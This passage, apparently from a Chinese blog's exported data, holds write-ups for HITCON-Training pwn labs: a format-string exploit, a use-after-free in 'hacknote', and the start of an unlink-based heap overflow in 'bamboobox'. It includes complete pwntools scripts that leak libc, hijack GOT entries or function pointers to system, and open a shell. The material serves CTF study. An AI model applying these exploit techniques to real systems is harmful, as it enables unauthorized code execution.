class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./playfmt\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./playfmt\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"%15$paaaa\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">addr = int(p.recvuntil(<span class=\"string\">\"aaaa\"</span>).split(<span class=\"string\">'aaaa'</span>)[<span class=\"number\">0</span>].split(<span class=\"string\">\"\\n\"</span>)[<span class=\"number\">-1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>] - <span class=\"number\">247</span></span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">printfgot = elf.got[<span class=\"string\">'printf'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">\"%6$x\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">ebp2 = int(<span class=\"string\">\"0x\"</span> + p.recvline().strip(), <span class=\"number\">16</span>)</span><br><span class=\"line\">ebp1 = ebp2 - <span class=\"number\">0x10</span></span><br><span class=\"line\">nop2 = ebp2 + <span class=\"number\">0x4</span></span><br><span class=\"line\">nop1 = ebp2 - <span class=\"number\">0xc</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [ebp2] = nop1</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(nop1 &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%6$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [nop1] = printgot</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(printfgot &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%10$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [ebp2] = nop2</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(nop2 &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%6$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [nop2] = printgot + 2</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str((printfgot + <span class=\"number\">2</span>) &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%10$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [printgot] = system</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(system &gt;&gt; <span class=\"number\">16</span> &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%11$hn\"</span> + <span class=\"string\">\"%\"</span> + str(((system &amp; <span class=\"number\">0xffff</span>) - (system &gt;&gt; <span class=\"number\">16</span> &amp; <span class=\"number\">0xffff</span>)) &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%7$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<hr>\n<p>本篇到此为止，接下来是glibc heap exploit的题解。</p>\n","text":"Lab1——sysmagic防护1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic<br>[*] &apos;/home/liwc/pwn","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":3,"path":"api/tags/pwn.json"}]},{"title":"HITCON_training题解(二)","slug":"HITCON-training-2","date":"2019-04-10T06:47:59.000Z","updated":"2019-04-10T06:58:06.000Z","comments":true,"path":"api/articles/HITCON-training-2.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"Lab10——hacknote\"><a href=\"#Lab10——hacknote\" class=\"headerlink\" title=\"Lab10——hacknote\"></a>Lab10——hacknote</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checksec hacknote</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab10/hacknote&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>本题是一道典型的堆菜单题，共有4个选项</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. Add note          </span><br><span class=\"line\">2. Delete note       </span><br><span class=\"line\">3. Print note        </span><br><span class=\"line\">4. Exit</span><br></pre></td></tr></table></figure>\n<h4 id=\"add-note\"><a href=\"#add-note\" class=\"headerlink\" title=\"add note\"></a>add note</h4><p>逆向可以得到note的结构如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct note&#123;</span><br><span class=\"line\">\tDWORD *funcptr;</span><br><span class=\"line\">\tDWORD *content;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>每次执行add note操作会malloc两个chunk，首先会malloc(0x8)存储note结构体，将指针存在bss段的全局指针数组notelist；然后会根据输入的size，malloc(size)的chunk，并向其中读入size大小的数据。一个指向print_note_content函数的函数指针funcptr和指向存储数据的chunk的指针content会被存储在note结构体中。</p>\n<h4 id=\"del-note\"><a href=\"#del-note\" class=\"headerlink\" title=\"del note\"></a>del note</h4><p>首先读入符合要求的index，如果相应的数组项不为NULL，就会<em>依次free掉存储content的chunk和存储note的chunk</em>。注意这里存在UAF漏洞，并没有将notelist上存储的指向note的野指针置为NULL，所以即使在free后我们也可以任意的对这些指针进行解引用。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> <span class=\"title\">del_note</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt;= count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( notelist[v1] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)notelist[v1] + <span class=\"number\">1</span>)); &lt;= uaf vul</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(notelist[v1]);\t\t\t\t\t\t\t\t\t&lt;= uaf vul</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Success\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"print-note\"><a href=\"#print-note\" class=\"headerlink\" title=\"print note\"></a>print note</h4><p>该功能中会调用note结构体中存储的print_note_content函数指针，打印出content的内容。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( notelist[v1] )</span><br><span class=\"line\">  (*(<span class=\"keyword\">void</span> (__cdecl **)(<span class=\"keyword\">void</span> *))notelist[v1])(notelist[v1]);</span><br><span class=\"line\"><span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">print_note_content</span><span class=\"params\">(<span class=\"keyword\">int</span> a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(*(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **)(a1 + <span class=\"number\">4</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>实际上，该题中预留了一个magic函数，直接劫持函数指针到magic函数就可以实现利用。为了实现劫持，我们需要构造一个类型混淆的效果，即能够向note结构体里写内容。因为我们只能向content结构体写，所以我们需要利用uaf漏洞构造一个类似的效果。</p>\n<p>首先malloc两个size为0x10的note，然后del掉index0的chunk，此时size为0x8的fastbin中有两个chunk，size为0x10的fastbin中有两个chunk。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd -&gt; note2(chunk2)-&gt;note(chunk0)</span><br><span class=\"line\">fd -&gt; content2(chunk3) -&gt; content(chunk1)</span><br></pre></td></tr></table></figure>\n<p>然后再malloc一个size为0x8的note，就会将两个size为0x8的chunk从fastbin上取下来，而chunk0则作为index2的content，也就是index0的note。所以我们就可以通过向index2的content中写来修改index0的note，也就可以劫持函数指针了。</p>\n<p>利用代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">magic = <span class=\"number\">0x8048986</span></span><br><span class=\"line\">add(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(magic) + p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"提高\"><a href=\"#提高\" class=\"headerlink\" title=\"提高\"></a>提高</h3><p>我们给该题加大难度，假设不存在magic函数，或者说我们想要直接RCE执行任意指令，那应该怎么办呢？</p>\n<p>第一步应该是leak libc，我们可以利用和上述类似的思路，将函数指针覆盖为原来的print_note_content函数，将content覆盖为got表的指针，从而leak出got表。</p>\n<p>第二步是将函数指针覆盖为system，将content覆盖为/bin/sh，然后getshell。</p>\n<p>这里有两个难点：</p>\n<ul>\n<li>因为这道菜单题没有edit函数，所以我们可以直接free掉那两个0x8的chunk然后在重新申请的时候布置堆块内容即可。</li>\n<li>如果直接输入/bin/sh，由于前面有一些杂乱的数据，会使得shell命令执行失败。我们可以用”||”或者”;”截断，然后直接用sh即可。因为有些环境中，/bin本来就在环境变量中，所以直接用sh也可以。这里如果用<code>;/bin/sh\\x00</code>，就会超过8个byte，所以我们只能用<code>;sh\\x00</code>碰碰运气。幸运的是，我们成功了。</li>\n</ul>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./hacknote\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./hacknote\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"size :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(len(content)))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Content :\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">print_ = <span class=\"number\">0x804865b</span></span><br><span class=\"line\">got = elf.got[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">add(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(print_) + p32(got)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">del_note(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload = p32(system) + <span class=\"string\">\";sh\\x00\"</span></span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab11——Bamboobox\"><a href=\"#Lab11——Bamboobox\" class=\"headerlink\" title=\"Lab11——Bamboobox\"></a>Lab11——Bamboobox</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>该题终于是一道64位的题了，仍旧开启了canary和nx，没有开启pie。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab11$ checksec bamboobox</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab11/bamboobox&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>仍旧是标准菜单题，该题有五个功能，即增删改查和退出。</p>\n<p>该题漏洞位于change_item函数中：</p>\n<p>虽然在申请chunk的时候是根据输入的size进行malloc操作，但并没有存储size，所以在change的时候未对size进行校验，而是根据此次指定的长度对堆进行写入，也就是存在一个潜在的堆任意写漏洞。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">change_item</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v0; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-2Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> nptr; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( num )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the index of item:\"</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">    v2 = atoi(&amp;buf);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(_QWORD *)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>] )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the length of item name:\"</span>, &amp;buf);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, &amp;nptr, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">      v0 = atoi(&amp;nptr);</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the new name of the item:\"</span>, &amp;nptr);</span><br><span class=\"line\">      *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>] + (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)read(<span class=\"number\">0</span>, *(<span class=\"keyword\">void</span> **)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>], v0)) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"invaild index\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No item in the box\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该题也是采用全局变量管理堆块指针，将申请chunk的size和对应指针依次存放在bss段。也就是说，如果我们能够修改bss段的指向chunk的指针为任意地址，我们也就可以利用show和edit函数实现任意地址读写。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>根据上述分析，要实现bss段修改，结合该题的堆溢出漏洞，构造一个unlink利用来使得bss段上的chunk指针向前移动0x18个byte，然后修改chunk指针，实现任意地址读写，从而leak处libc，再劫持atoi@got（malloc_hook和free_hook似乎也可以）为one_gadget从而getshell。</p>\n<p>注意unlink利用有如下要点：</p>\n<ul>\n<li>需要在free时触发前向或后向合并，条件有：<ul>\n<li>free的堆块位于unsorted bin范围内（64位最小为0x80）</li>\n<li>free的堆块的前一个或后一个堆块未被使用（被free），这根据当前chunk的prev_inuse位判断，并且需要构造prev_size，在当前chunk的地址 - prev_size的位置布置一个fake chunk</li>\n<li>fake chunk需要保证fake chunk的next chunk的prev_size和自己的size相同</li>\n</ul>\n</li>\n<li>野指针需要指向被合并的fake chunk的user_data区间，然后从user_data部分开始构造fake chunk</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span 